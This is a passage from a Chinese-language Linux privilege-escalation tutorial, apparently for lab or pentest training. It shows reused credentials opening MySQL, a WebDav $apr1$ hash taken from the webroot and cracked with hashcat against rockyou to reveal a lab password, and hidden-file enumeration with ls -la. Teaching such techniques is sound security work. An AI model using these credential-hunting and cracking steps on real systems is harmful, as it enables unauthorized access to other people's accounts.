<p><img decoding="async" loading="lazy" src="data:image/png;base64,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" width="281" height="63" class="img_ev3q"></p>
<p>测试中我们发现认证失败了，这说明该密码并不是 root 帐户的密码。</p>
<p>但是，当我们尝试使用这些凭据访问 MySQL 数据库时，我们能够顺利进入！</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mysql -u root -p</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240717140849236-1802304842-adb3346695df832ebadbe830d2f73174.png" width="642" height="253" class="img_ev3q"></p>
<p>在这里，我们可以枚举数据库以获取更多密码哈希值（稍后详述），甚至可以设置 UDF 漏洞并提升到 root。</p>
<blockquote>
<p>如果您想了解如何通过使用 UDF 漏洞利用 MySQL 数据库来提升权限，请查看我关于此主题的<a href="https://www.cnblogs.com/kqdssheng/p/18254942" target="_blank" rel="noopener noreferrer">帖子</a>。</p>
</blockquote>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="22web-文件中的密码"><strong><div id="id2.2">2.2、Web 文件中的密码</div></strong><a href="#22web-文件中的密码" class="hash-link" aria-label="22web-文件中的密码的直接链接" title="22web-文件中的密码的直接链接">​</a></h4>
<p>如前所述，我们可以在 webroot 中找到许多文件来查找凭据。其中一个文件用于存储 WebDav 服务器的凭据。</p>
<blockquote>
<p>WebDav 是一个供用户在服务器上创建、更改和移动文档的框架。</p>
</blockquote>
<p>WebDav 密码是哈希值，使用名为 <strong>htpasswd</strong> 的工具生成。凭证将提供对 WebDav 服务器的访问权限，通常位于网站后台，以允许文件上传等。</p>
<p>攻击此服务通常是使用名为 <strong>cadaver</strong> 的工具在外部完成的，该工具用于上传恶意 PHP 文件协助获取 shell。通过恶意 PHP 获取到的 Shell 的身份通常是 www-data，但也可能是标准用户，甚至是 root。</p>
<p>尽管攻击该服务通常是为了在目标上获得立足点，但由于它使用密码文件，因此也可帮助权限提升。</p>
<p>继续在 webroot 中搜索，我们在 /var/www/htmp/web/webdav 目录中找到一个一个名为 <strong>passwd.dav</strong> 的有趣文件</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240717140849754-1252782823-2b3c00c0b0ba51e3b2a8290014a676e2.png" width="493" height="94" class="img_ev3q"></p>
<blockquote>
<p>使用 htpasswd 生成的密码文件没有指定的扩展名。因此，使用 WebDav 凭据生成的文件可以具有任何扩展名，甚至根本没有扩展名。我见过：*.password / *.dav / *.pwd 等。</p>
</blockquote>
<p>打开文件，我们可以看到有一个以以下内容开头的密码哈希：<code>$apr1$ — 一个专门针对 Apache 而修改的 MD5 版本</code>。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240717140848838-1913572304-3aba2d19aa6593dcaf8f83574bf30c9e.png" width="523" height="47" class="img_ev3q"></p>
<p>我们可以看到哈希值属于 <strong>devops</strong> 用户，检查 /etc/passwd 文件，我们可以确定该账户在系统上是有效用户！</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240717140850954-226990144-059852c9fa9d4f63c41956cba36f2642.png" width="642" height="49" class="img_ev3q"></p>
<p>有了这些信息，我们就应该考虑破解这个哈希值，因为它可能与用户的实际密码相同，并允许我们登入 devops 用户。不过，即使 /etc/passwd 中不存在 devops 用户，我们仍应尝试破解该密码，并将其添加到密码列表中，以便在其他可能的地方进行测试尝试。</p>
<h6 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="221使用-hashcat-破解密码"><strong><div id="id2.2.1">2.2.1、使用 Hashcat 破解密码</div></strong><a href="#221使用-hashcat-破解密码" class="hash-link" aria-label="221使用-hashcat-破解密码的直接链接" title="221使用-hashcat-破解密码的直接链接">​</a></h6>
<p>为了准备破解这个哈希，我们可以复制 passwd.dav 文件的内容（不包含用户名和冒号）并将其粘贴到攻击者机器上的 TXT 文件中。</p>
<p>完成后，我们可以使用 hashcat 的以下命令来查找此类哈希对应的破解模式：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">hashcat -h | grep -i &#x27;$apr&#x27;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240717140849024-1737594037-b3abde11d91906cf7eda508ed172baaa.png" width="761" height="147" class="img_ev3q"></p>
<p>我们发现此哈希类型的破解模式是 1600，可以将其插入以下命令以开始破解此哈希。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">hashcat -m 1600 ./webdav.hash /usr/share/wordlists/rockyou.txt -o cracked.dav</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240717140849165-832825219-098ad03255206cf24f8a3675cf83bde1.png" width="674" height="71" class="img_ev3q"></p>
<p>仅一秒钟，哈希就被成功破解！</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240717140850002-417935686-9da34c46368eb4dd38a6d47ae7069fc2.png" width="622" height="308" class="img_ev3q"></p>
<p>检查输出文件 <strong>cracked.dav</strong>，我们可以看到我们已经成功恢复密码。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240717140849392-503030659-81a77e29cfdfd24b00d7cf2886b14e46.png" width="416" height="64" class="img_ev3q"></p>
<p><strong>devops : DeVeLoPeR712</strong></p>
<p>现在我们已经找到了系统中的一组有效凭据，就可以尝试使用 <strong>su</strong> 进入该用户，让我们更接近 root 身份。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240717140849103-1373681519-d2874e2d53af039cd9ad3bc4786bbeba.png" width="375" height="79" class="img_ev3q"></p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="3密码搜寻--隐藏文件文件夹"><strong><div id="id3">3、密码搜寻 – 隐藏文件/文件夹</div></strong><a href="#3密码搜寻--隐藏文件文件夹" class="hash-link" aria-label="3密码搜寻--隐藏文件文件夹的直接链接" title="3密码搜寻--隐藏文件文件夹的直接链接">​</a></h2>
<p>任何目录内都可能存在隐藏的文件或文件夹，但如果您不查找它们，就不会看到它们。</p>
<p>在类 Unix 系统上，隐藏文件和文件夹都以句点开头，如 .bash_history 文件或 .ssh 文件夹。</p>
<p>要查找隐藏的文件或文件夹，我们可以使用 ls 命令的 “-a” 参数，如下所示：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ls -la</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>我们应该养成 在使用 ls 命令时始终添加 -a 参数的习惯，如此，便不会在枚举过程中错过任何有趣的文件或文件夹。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="31隐藏文件文件夹中的密码"><strong><div id="id3.1">3.1、隐藏文件/文件夹中的密码</div></strong><a href="#31隐藏文件文件夹中的密码" class="hash-link" aria-label="31隐藏文件文件夹中的密码的直接链接" title="31隐藏文件文件夹中的密码的直接链接">​</a></h4>
<p>在受害者机器上找到立足点后，我们首先要查找的是文件系统根目录下的任何非标准和/或隐藏文件/文件夹。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ls -la /</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" 